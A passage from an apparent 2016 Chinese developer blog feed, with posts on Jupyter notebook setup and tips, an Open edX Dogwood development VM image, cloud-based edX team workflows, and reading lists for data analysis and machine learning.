#常用：jupyter notebook --no-browser --port 5000 --ip=0.0.0.0 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;rich output&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;from IPython.display import HTML, Image, YouTubeVideo
from IPython.display import Image
Image(url=&amp;#39;http://python.org/images/python-logo.gif&amp;#39;)
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;a href="https://nbviewer.jupyter.org/github/ipython/ipython/blob/master/examples/IPython%20Kernel/Rich%20Output.ipynb"&gt;Rich Output&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/ipython-books/minibook-2nd-code/blob/master/chapter6/63-rich.ipynb"&gt;Displaying rich HTML elements in the Notebook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;数学公式&lt;/h3&gt;
&lt;p&gt;在jupyter中写markdown，支持mathjax，&lt;code&gt;$$e=mc^2$$&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;书签&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;%bookmark -l  #结合cd使用，方便切换目录&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;配置&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ipython locate : 查看配置&lt;/li&gt;
&lt;li&gt;jupyter notebook --generate-config ： 如果没有&lt;code&gt;~/.jupyter/jupyter_notebook_config.py&lt;/code&gt;，则执行这条命令，之后在此做配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;vim ~/.jupyter/jupyter_notebook_config.py&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# The directory to use for notebooks.这决定了jupyter启动目录
c.NotebookApp.notebook_dir = u&amp;#39;/path/to/your/notebooks&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;绑定vim&lt;a href="https://github.com/lambdalisue/jupyter-vim-binding"&gt;jupyter-vim-binding&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;主题：&lt;a href="https://github.com/transcranial/jupyter-themer"&gt;jupyter-themer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;拓展：&lt;a href="https://github.com/ipython-contrib/IPython-notebook-extensions"&gt;IPython-notebook-extensions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;http://127.0.0.1:8888/nbextensions : 设置&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;文档&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jupyter.readthedocs.org/en/latest/index.html"&gt;Jupyter Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;ipynb&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/danielfrg/pelican-ipynb"&gt;pelican-ipynb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;github直接支持ipynb文件预览&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.datahub.top/home/"&gt;http://www.datahub.top/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;使用jupyter写ppt&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;jupyter-nbconvert --to slides How-to.ipynb --reveal-prefix '//cdn.bootcss.com/reveal.js/3.2.0' --output slides&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;参考&lt;a href="http://rainy.im/nb/How-to.html#/3"&gt;how-to&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这是我用jupyter写的ppt：&lt;a href="https://github.com/wwj718/presentation-edx"&gt;presentation-edx&lt;/a&gt; (Open edX Beijing meetup上的一个分享)&lt;/p&gt;
&lt;h1&gt;IPython kernels for other languages&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython/wiki/IPython-kernels-for-other-languages"&gt;IPython kernels for other languages&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;实验特性:&lt;a href="https://github.com/jupyter/jupyterlab"&gt;jupyterlab&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;增强jupyter的编辑能力(强烈推荐！)，使jupyter如IDE一般强大&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pip install &lt;a href="https://github.com/jupyter/jupyterlab"&gt;jupyterlab&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;jupyter serverextension enable --py jupyterlab&lt;/li&gt;
&lt;li&gt;jupyter lab --notebook-dir="."&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;我关注的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/takluyver/igo"&gt;igo&lt;/a&gt; : 会报错&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/takluyver/bash_kernel"&gt;bash_kernel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/bollwyvl/hy_kernel/"&gt;hy_kernel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/n-riesco/ijavascript"&gt;ijavascript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;同时支持pyhton2，python3&lt;ul&gt;
&lt;li&gt;source ~/py3/bin/activate.fish&lt;/li&gt;
&lt;li&gt;pip3 install jupyter"&lt;/li&gt;
&lt;li&gt;ipython3 kernelspec install-self&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资源汇总&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython/wiki/A-gallery-of-interesting-IPython-Notebooks"&gt;A gallery of interesting IPython Notebooks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython-books/minibook-2nd-code"&gt;python minibooks&lt;/a&gt;：书籍&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;我喜欢的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython/wiki/A-gallery-of-interesting-IPython-Notebooks#pandas-for-data-analysis"&gt;Pandas for data analysis&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/url/taaviburns.ca/presentations/log_analysis_with_pandas/nb/5-Scatterplots.ipynb"&gt;log_analysis_with_pandas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/koldunovn/nk_public_notebooks/blob/master/Apache_log.ipynb"&gt;Apache log analysis with Pandas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="Key differences between Python 2.7.x and Python 3.x"&gt;http://nbviewer.jupyter.org/github/rasbt/python_reference/blob/master/tutorials/key_differences_between_python_2_and_3.ipynb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/rasbt/python_reference/blob/master/tutorials/not_so_obvious_python_stuff.ipynb?create=1"&gt;A collection of not-so-obvious Python stuff you should know!
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/28831854/how-do-i-add-python3-kernel-to-jupyter-ipython"&gt;How do I add python3 kernel to jupyter (Ipython)&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;在python2的虚拟环境张执行：&lt;code&gt;python3 -m pip install ipykernel &amp;amp; python3 -m ipykernel install --user&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;!python3 -m pip freeze&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.damian.oquanta.info/posts/make-your-slides-with-ipython.html"&gt;Make your slides with IPython&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;hack it&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/gist/minrk/6011986"&gt;Importing IPython Notebooks as Modules&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yoavram/CS1001.py"&gt;Computer Science with Python as Tel-Aviv University&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/DrSkippy/Data-Science-45min-Intros"&gt;Data-Science-45min-Intros&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;h3&gt;zmq相关问题&lt;/h3&gt;
&lt;p&gt;sudo pip install pyzmq --upgrade&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 26 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-26:jupyter-summary.html</guid><category>dev-tools</category></item><item><title>为edx dogwood版本开发者准备的ova镜像</title><link>/dowwood-for-dev.html</link><description>&lt;p&gt;镜像基于&lt;a href="http://edustack.org/"&gt;eduStack&lt;/a&gt;的版本:&lt;a href="http://45.32.248.32/eduStack.Dogwood.ova"&gt;eduStack.Dogwood.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;a href=""&gt;VMWare Workstation 12&lt;/a&gt;和&lt;a href=""&gt;&lt;/a&gt;都可正常使用&lt;/p&gt;
&lt;h3&gt;让局域网内可访问网站&lt;/h3&gt;
&lt;p&gt;采用bridged(桥接模式)即可。前提是你的网络能自动分配ip&lt;/p&gt;
&lt;h1&gt;账户&lt;/h1&gt;
&lt;p&gt;edx:edx&lt;/p&gt;
&lt;h3&gt;Features&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;edustack做好了汉化的工作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我为此添加了以下开发特性:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持ipyhton notebook&lt;ul&gt;
&lt;li&gt;使用方法:&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;vim优化&lt;/li&gt;
&lt;li&gt;htop&lt;/li&gt;
&lt;li&gt;fish&lt;/li&gt;
&lt;li&gt;z&lt;ul&gt;
&lt;li&gt;进入edx-platform目录只需要:&lt;code&gt;z edx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;永久token&lt;/li&gt;
&lt;li&gt;挂到vps上&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 23 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-23:dowwood-for-dev.html</guid><category>edx</category></item><item><title>基于云端环境的edx开发协作</title><link>/edx-dev-in-cloud.html</link><description>&lt;p&gt;本地开发edx有许多坑，其中一个是open edx的环境搭建十分复杂，而且极其耗费cpu和内存资源。如果每个小伙伴都自行折腾一遍，真是一个不小的精力浪费。而且由于各自平台的不同，出现的错误五花八门，虽然采用vagrant可以部分解决，但vagrant本身又引来了各种蛋疼的问题。&lt;/p&gt;
&lt;p&gt;就我个人而言，习惯分布式的协作，团队成员分布在全国各地，甚至国外，为了交流方便，常常围绕一个一致的中心，否则容易各说各的，这个中心包括源码远程仓库和一致的开发环境。&lt;/p&gt;
&lt;p&gt;为了让每个人专注在自己的领域，通过分工来达到最大效率，团队中最好有一个全栈(其实就是万金油 囧)来协调大家。全栈未必熟悉具体细节，但对流程应该能整体把握，以便来黏合不同领域和分配任务，划清职责&lt;/p&gt;
&lt;h1&gt;我们的开发环境&lt;/h1&gt;
&lt;p&gt;虽然我们的开发环境基于云，但思路是通用的，希望对你的团队也有用&lt;/p&gt;
&lt;p&gt;目前我们的开发环境在青云上，按需付费。1核4G内存(swap)就足够了,ip按流量计费。价格很廉价&lt;/p&gt;
&lt;p&gt;所有配置由技术负责人完成就行，任务量并不大。&lt;/p&gt;
&lt;h3&gt;云端开发环境&lt;/h3&gt;
&lt;p&gt;云上存有一份干净的原生dogwood镜像，在此基础上定制出公司的开发基础版，假设代号为&lt;code&gt;dogwood_base&lt;/code&gt;，该基础版包括一同通用的定制。&lt;/p&gt;
&lt;p&gt;前后端的开发均从中衍生各自的版本。&lt;/p&gt;
&lt;h3&gt;代码管理&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;只谈论核心仓库：edx-platform&lt;/li&gt;
&lt;li&gt;在git服务器上，存有公司定制的open edx源码库，存为私有仓库&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dogwood_base&lt;/code&gt;是基于named-release/Dogwood的分支&lt;/li&gt;
&lt;li&gt;团队每个成员均有自己的开发分支，命名为&lt;code&gt;&amp;lt;NAME&amp;gt;/&amp;lt;FEATURE&amp;gt;&lt;/code&gt;,&lt;code&gt;&amp;lt;NAME&amp;gt;&lt;/code&gt;为成员姓名,&lt;code&gt;&amp;lt;FEATURE&amp;gt;&lt;/code&gt;为功能代号&lt;/li&gt;
&lt;li&gt;技术负责人负责将各个开发代码merge到dogwood_base，当然你也可以采用gitflow工作流&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;后端开发&lt;/h1&gt;
&lt;p&gt;后端开发的同学，可能分布在网络各地&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tmux&lt;/code&gt;可以让你们在一个同个shell会话里协作:参考&lt;a href="http://www.kancloud.cn/kancloud/tmux/62466"&gt;使用 tmux 结对编程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;采用组来做到协同会话&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tmux new-session -s groupedsession
tmux new-session -t groupedsession -s mysession
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;新人入职&lt;/h4&gt;
&lt;p&gt;只需要给他分发一个镜像就好啦，环境的搭配十分容易。团队内经验的传递也是个影响效率的关键因素，通过tmux，新老员工能容易地结对编程，经验的传递变得容易。使用qq和文档互动性是很低的，而高互动性能明显提高学习效率，tmux，你值得拥有&lt;/p&gt;
&lt;h4&gt;为前端提供服务&lt;/h4&gt;
&lt;p&gt;前端同学一般对linux不怎么熟悉，后端同学最好能直接给他们一个一切就绪的环境，因为我自己在处理后端，所以给后端安排的任务会多些&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;负责后端的同学，折腾好配置环境，可以用我的&lt;a href="https://github.com/wwj718/edx_tools"&gt;edx_tools&lt;/a&gt;,按照这篇教程为前端同学准备好环境：&lt;a href="http://blog.just4fun.site/edx-front-dev-workflow.html"&gt;edx前端定制开发工作流&lt;/a&gt;,交付给前端的仅仅是个一切就绪的url&lt;/li&gt;
&lt;li&gt;将前端修改的文件拉取到themes目录，按照theme机制摆放定制文件，参考&lt;a href="https://github.com/edx/edx-platform/tree/master/themes"&gt;edx-platform/themes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;在云上开发xblock&lt;/h4&gt;
&lt;p&gt;相比于xblock-sdk，我更倾向于原生的环境，有了云的话，很容易将环境分发给xblock开发者&lt;/p&gt;
&lt;h4&gt;特性开发（遇到风险）&lt;/h4&gt;
&lt;p&gt;在开发一些新特性时，有些特性可能会搞坏环境，当这种情况出现，云环境能很好帮到你，做个快照只要你不到一分钟的时间&lt;/p&gt;
&lt;h1&gt;前端开发&lt;/h1&gt;
&lt;p&gt;由于云端是外网可访问的，后端同学可以帮助前端构建好所有的环境，所以前端可以专注在前端开发，不需要与环境和服务器打交道（open edx的环境对于后端同学来说头很头疼，实在不该把锅甩给前端，毕竟术业有专攻）&lt;/p&gt;
&lt;p&gt;前端同学只需要打开浏览器，输入ip就得到一个干净的开发环境，所需要做的只是用Chrome Dev Tools或者firebug来直接调试scss代码&lt;/p&gt;
&lt;p&gt;&lt;img alt="sass1.png" src="img/edx/sass/sass1.png" /&gt;&lt;/p&gt;
&lt;p&gt;前端同学的工作流为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;配置好chrome/firefox， 使其支持sass调试，参考&lt;a href="http://thesassway.com/intermediate/using-source-maps-with-sass"&gt;Using source maps with Sass 3.3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;直接在chrome里调试,如下如
&lt;img alt="sas2" src="img/edx/sass/sass2.png" /&gt;&lt;/li&gt;
&lt;li&gt;由于在chrome里的修改只对当然会话有效，我们需要将修改保存到本地，使用git管理，每个修改旁边都应该有注释说明，注释格式为：&lt;code&gt;// &amp;lt;NAME&amp;gt;:&amp;lt;MESSAGE&amp;gt;&lt;/code&gt;
&lt;img alt="sas3" src="img/edx/sass/sass3.png" /&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 18 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-18:edx-dev-in-cloud.html</guid><category>edx</category></item><item><title>数据分析和可视化(我的学习资料)</title><link>/Data-analysis-and-visualization.html</link><description>&lt;p&gt;对数据分析和可视化这块一直兴趣满满，保持关注，搜集了一些不错的资料，整理分享给大家&lt;/p&gt;
&lt;p&gt;语言层面，我主要在关注Python和JavaScript，所以资料可能多与这两门语言有关&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;优秀文章(入门引导)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/89674/"&gt;The Log：每个程序员都应该知道有关实时数据的统一抽象（1）概念&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.oschina.net/translate/log-what-every-software-engineer-should-know-about-real-time-datas-unifying"&gt;日志：每个软件工程师都应该知道的有关实时数据的统一概念&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80981/"&gt;数据科学的完整学习路径（Python版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81133/"&gt;Python数据分析入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/80853/"&gt;Python和数据科学的起步指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;公共数据源&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/caesar0301/awesome-public-datasets"&gt;awesome-public-datasets&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其中我们可以看到香港公开的数据：&lt;a href="https://data.gov.hk/sc"&gt;data.gov.hk&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Python&lt;/h1&gt;
&lt;h3&gt;ipython notebook&lt;/h3&gt;
&lt;p&gt;我喜欢使用ipython notebook（现在改名为jupyter）来探索数据，这是个值得一学的神器，可以看看我此前写的文章：&lt;a href="http://blog.just4fun.site/use-ipython-notebook.html"&gt;使用IPython Notebook来学习编程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用ipython notebook来探索数据有许多好处，其中的一点是可以轻易分享经验和成果，现在有许多教程是基于它的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/DrSkippy/Data-Science-45min-Intros"&gt;Data-Science-45min-Intros&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jrjohansson/scientific-python-lectures/tree/master/"&gt;scientific-python-lectures&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/data-science-ipython-notebooks"&gt;data-science-ipython-notebooks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/interactive-coding-challenges"&gt;interactive-coding-challenges&lt;/a&gt;:这个主要是算法&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;Pytho科学计算生态的介绍的中文翻译&lt;/a&gt;-&lt;a href="https://github.com/cloga/scipy-lecture-notes_cn"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://github.com/pydata/pandas"&gt;pandas&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jvns/pandas-cookbook"&gt;pandas-cookbook&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nbviewer.jupyter.org/github/jvns/pandas-cookbook/tree/master/cookbook/"&gt;http://nbviewer.jupyter.org/&lt;/a&gt;:从这里快速上手&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/Zhihu_bigdata"&gt;Zhihu_bigdata&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;相关工具&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/robdmc/pandashells"&gt;pandashells&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ipython/ipython/wiki/A-gallery-of-interesting-IPython-Notebooks#pandas-for-data-analysis"&gt;Pandas for data analysis&lt;/a&gt; :ipynb&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;JavaScript&lt;/h1&gt;
&lt;h3&gt;&lt;a href="https://github.com/mbostock/d3"&gt;d3&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mbostock/d3/wiki/Gallery"&gt;案例展示&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ourd3js.com/wordpress/?cat=2"&gt;D3 入门系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;一些建议：&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22171866"&gt;学习d3js有没有一个系统的学习方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/38648735"&gt;如何评价 D3.js这个框架？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/c3800c61d2fb"&gt;D3.js入门指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;在线学习&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/datasciencemasters/go"&gt;The Open Source Data Science Masters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dataquest.io/"&gt;dataquest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;博客&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rushter/data-science-blogs"&gt;data-science-blogs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;真实项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rhiever/Data-Analysis-and-Machine-Learning-Projects"&gt;Data-Analysis-and-Machine-Learning-Projects&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/29265587"&gt;如何快速成为数据分析师？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/okulbilisim/awesome-datascience"&gt;awesome-datascience&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;一些好书&lt;/h1&gt;
&lt;h3&gt;数据挖掘概念&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://book.douban.com/subject/5377669/"&gt;数据挖掘导论&lt;/a&gt;
&lt;a href="http://book.douban.com/subject/11542972/"&gt;数据挖掘:概念与技术&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;统计学&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/7056708/"&gt;深入浅出统计学&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/10590856/"&gt;统计学习方法&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/25779298/"&gt;利用Python进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;数据库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24250054/"&gt;SQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3354490/"&gt;MySQL必知必会&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;机器学习&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3288908/"&gt;集体智慧编程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/24703171/"&gt;机器学习实战&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他入门好书&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/6862061/"&gt;计算机科学概论（第11版）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://book.douban.com/subject/3040870/"&gt;Head First HTML与CSS、XHTML&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-16:Data-analysis-and-visualization.html</guid><category>dev-tools</category></item><item><title>机器学习与人工智能(我的学习资料)</title><link>/machine-leanring-and-ai.html</link><description>&lt;h1&gt;我的兴趣点(目前)&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;作诗机&lt;/li&gt;
&lt;li&gt;人工智能&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;策略&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过折腾来学习，先把它当做黑盒，关注输入和输出，使用增量法探索，同时阅读统计学和相关工具&lt;/li&gt;
&lt;li&gt;基于ipython notebook来探索&lt;/li&gt;
&lt;li&gt;coursera：&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;统计学基础：《深入浅出统计学》&lt;/li&gt;
&lt;li&gt;《神经网络与深度学习讲义》（已粗看一遍）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;入门文章&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/67616/"&gt;有趣的机器学习：最简明入门指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50338/"&gt;如何向外行解释机器学习和数据挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.almosthuman.cn/2016/01/23/koarh/"&gt;神经网络和深度学习简史&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;学习路径&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/hangtwenty/dive-into-machine-learning"&gt;dive-into-machine-learning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/scikit-learn/scikit-learn"&gt;scikit-learn&lt;/a&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://python.jobbole.com/81721/"&gt;基于 Python 和 Scikit-Learn 的机器学习介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/a/1190000002672062"&gt;机器学习探索之路1：机器学习相关工具介绍与安装&lt;/a&gt;:选择anaconda！&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gmonce/scikit-learn-book"&gt;scikit-learn-book&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/justmarkham/scikit-learn-videos"&gt;scikit-learn-videos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.xgezhang.com/scikit_learn_ml_translation.html"&gt;Scikit-Learn机器学习介绍（中文翻译）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://muxuezi.github.io/categories/scikit-learn-cookbook.html"&gt;Posts about scikit-learn cookbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;mooc&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.coursera.org/learn/machine-learning/"&gt;机器学习&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;资料集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ty4z2008/Qix/blob/master/dl.md"&gt;机器学习(Machine Learning)&amp;amp;深度学习(Deep Learning)资料(Chapter 1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/56256/"&gt;机器学习的最佳入门学习资源&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/73806/"&gt;国外程序员整理的机器学习资源大全&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;知乎问答&lt;/h1&gt;
&lt;ul&gt;
